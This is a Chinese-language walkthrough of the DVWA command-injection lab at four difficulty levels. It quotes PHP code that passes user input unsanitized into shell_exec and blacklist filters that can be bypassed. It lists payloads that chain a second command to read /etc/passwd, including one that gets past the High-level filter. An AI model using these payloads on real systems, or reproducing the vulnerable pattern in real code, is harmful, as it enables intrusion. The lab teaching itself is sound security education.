@@ -1,0 +1,92 @@
+# 链接(URL)：https://www.wuyini.cn/672.html
+
+
+Command Injection 命令注入
+用户可以执行恶意代码语句，在实战中危害比较高，也称作命令执行，一般属于高危漏洞。
+
+Low
+Php
+
+Low 级别这里直接将 target 变量给带入到 shell_exec 命令执行的函数里面了，这样是及其危险的，可以使用使用如下命令连接符号来拼接自己的命令：
+
+// 获取 ip
+$target = $_REQUEST[ 'ip' ];
+ 
+// 判断操作系统来细化 ping 命令
+if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+  // Windows
+  $cmd = shell_exec( 'ping  ' . $target );
+}
+else {
+  // *nix 需要手动指定 ping 命令的次数
+  $cmd = shell_exec( 'ping  -c 4 ' . $target );
+}
+ 
+// 输出命令执行的结果
+echo "<pre>{$cmd}</pre>"; 
+符号	说明
+A;B	A 不论正确与否都会执行 B 命令
+A&B	A 后台运行，A 和 B 同时执行
+A&&B	A 执行成功时候才会执行 B 命令
+A|B	A 执行的输出结果，作为 B 命令的参数，A 不论正确与否都会执行 B 命令
+A||B	A 执行失败后才会执行 B 命令
+所以这一个基础关卡我们可以尝试输入如下 Payload：Bash
+
+127.0.0.1 ; cat /etc/passwd
+127.0.0.1 & cat /etc/passwd
+127.0.0.1 && cat /etc/passwd
+127.0.0.1 | cat /etc/passwd
+233 || cat /etc/passwd
+
+Medium
+直接看关键部分的代码吧：Php
+
+$substitutions = array(
+  '&&' => '',
+  ';'  => '',
+); 
+ 
+// 移除黑名单字符
+$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+可以看到这里黑名单只过滤了两种情况，实际上依然还可使用如下 Payload:Bash
+
+127.0.0.1 & cat /etc/passwd
+127.0.0.1 | cat /etc/passwd
+233 || cat /etc/passwd
+High
+首先来看下 High 级别的过滤代码：Php
+
+$substitutions = array(
+        '&'  => '',
+        ';'  => '',
+        '| ' => '',
+        '-'  => '',
+        '$'  => '',
+        '('  => '',
+        ')'  => '',
+        '`'  => '',
+        '||' => '',
+    );
+这里乍一看敏感字符都被过滤了，这里实际上是考擦眼力的地方：Php
+
+'| ' => '',
+没错这个管道符是 | 是带空格的，所以这里我们不使用空格的话依然可以绕过：Bash
+
+127.0.0.1 |cat /etc/passwd
+127.0.0.1|cat /etc/passwd
+
+Impossible
+下面来看一下 Impossible 的代码，学习一下安全的过滤方式：Php
+
+# 以 . 作分隔符 分隔 $target
+$octet = explode( ".", $target );
+ 
+// 检测分隔后的元素是否都是数字类型
+if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
+  // 如果都是数字类型的话 还原 $target
+  $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];
+else {
+  // 否则提示输出无效
+  $html .= '<pre>ERROR: You have entered an invalid IP.</pre>';
+}
+这种过滤方式类似于 白名单 的过滤方式了，白名单的话 相比 黑名单来说还是比较实用方便的。
